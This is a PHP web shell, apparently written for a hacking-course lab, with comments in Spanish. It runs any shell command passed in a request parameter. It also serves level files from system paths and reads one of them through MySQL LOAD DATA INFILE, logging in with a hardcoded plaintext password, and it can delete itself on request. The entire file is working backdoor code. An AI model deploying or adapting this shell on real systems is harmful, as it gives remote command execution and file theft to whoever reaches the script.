<?php
// 2016/10 JokinAU@EnigmaDOS
if (isset($_REQUEST['cmd'])):	// es una shell?
	echo shell_exec($_REQUEST['cmd']);
else:	//o es downloader?
	$host = str_replace('.localdomain', '', gethostname()); //team-0012
	$level3='';
	switch ($_REQUEST['level']):
		case 1:
			$file='/usr/share/doc/base-files/mooc-hacking-'.$host.'-level-01.gpg';
			break;
		case 2:
			$file='/srv/ftp/mooc-hacking-'.$host.'-level-02.gpg';
			break;
		case 3:
			$file='/var/lib/mysql/mooc-hacking-'.$host.'-level-03.gpg';
			$con=mysql_connect('localhost', 'cacti', 'epMeOwAb9') or die(mysql_error());
			mysql_select_db('cacti') or die(mysql_error());
			mysql_query('CREATE TABLE IF NOT EXISTS tmp (path longtext not null)', $con) or die(mysql_error());
			mysql_query("LOAD DATA INFILE '{$file}' INTO TABLE tmp", $con) or die(mysql_error());
			$val=mysql_query('SELECT * FROM tmp', $con) or die(mysql_error());
			while ($row=mysql_fetch_assoc($val)):
				$level3 .= $row[path]."\n";
			endwhile;
			mysql_query('DROP TABLE tmp', $con);
			mysql_close($con);
			break;
		case 0:
			echo 'Self destructing in 3, 2, 1... ';
			unlink($_SERVER['SCRIPT_FILENAME']);
			echo 'DONE!';
			exit;
		default:
			echo 'Define cmd or level';
			die(0);
	endswitch;
	$base = basename($file);
	//cabeceras para forzar descarga
	header("Content-Description: File Transfer");
	header("Content-Type: application/application/pgp-encrypted");
	header("Content-Disposition: attachment; filename=\"$base\"");
	//leer y enviar fichero (o fichero3 desde variable)
	if($_REQUEST['level']==3):
		echo $level3;
	else:
		readfile ($file);
	endif;
endif;
?>